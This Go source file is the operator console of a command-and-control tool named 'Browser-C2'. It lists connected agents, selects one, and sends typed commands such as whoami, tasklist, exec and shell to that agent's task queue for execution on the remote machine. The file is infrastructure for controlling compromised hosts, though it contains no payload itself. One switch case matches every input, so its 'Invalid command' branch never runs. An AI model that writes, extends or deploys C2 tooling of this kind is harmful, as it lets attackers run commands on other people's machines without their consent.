package main

import (
	"github.com/chzyer/readline"
	"fmt"
	"io"
	"strings"

)

var context string = "main"
var prompt string = "Browser-C2 (\033[0;32m%s\033[0;0m)\033[31m >> \033[0;0m"



var MainCompleter = readline.NewPrefixCompleter(
	// List agents
	readline.PcItem("agents"),
	//Use agent
	readline.PcItem("use"),
	// Exit
	readline.PcItem("exit"),
)

var AgentCompleter = readline.NewPrefixCompleter(
	readline.PcItem("whoami"),
	readline.PcItem("tasklist"),
	readline.PcItem("exec"),
	readline.PcItem("shell"),
	readline.PcItem("back"),
)


func backMain(l *readline.Instance){
	context = "main"
	l.SetPrompt(fmt.Sprintf(prompt,"main"))
	l.Config.AutoComplete = MainCompleter
}


func HandleAgentCommands(agentName string, l *readline.Instance){
	// Add function to check if Agent exists
	l.Config.AutoComplete = AgentCompleter
	l.SetPrompt(fmt.Sprintf(prompt,agentName))

	for {
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch line{
			case "back":
				backMain(l)
				return
			case "":
			// Ignore when the user presses enter.
			default:
				AddCommand(agentName,line)
		}
	}
}

func HandleInput(line string ,l *readline.Instance)  {

	switch {

		// Handle the use functions
		case strings.HasPrefix(line, "use "):

			temp := strings.Split(line," ")
			if len(temp) > 1 {
				agent := temp[1]
				HandleAgentCommands(agent,l)
			}
			// Prints the Agents
		case strings.HasPrefix(line, "agents"):
			PrintAgents()
		case strings.HasPrefix(line,""):

		default:
			fmt.Println("Invalid command")
		}

	}



func StartTerminal()  {
	l, err := readline.NewEx(&readline.Config{
		Prompt:          fmt.Sprintf(prompt,"main"),
		HistoryFile:     "history.tmp",
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
		AutoComplete:	 MainCompleter,

	})

	if err != nil {
		panic(err)
	}
	defer l.Close()

	for {

		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		HandleInput(line,l)

	}
}
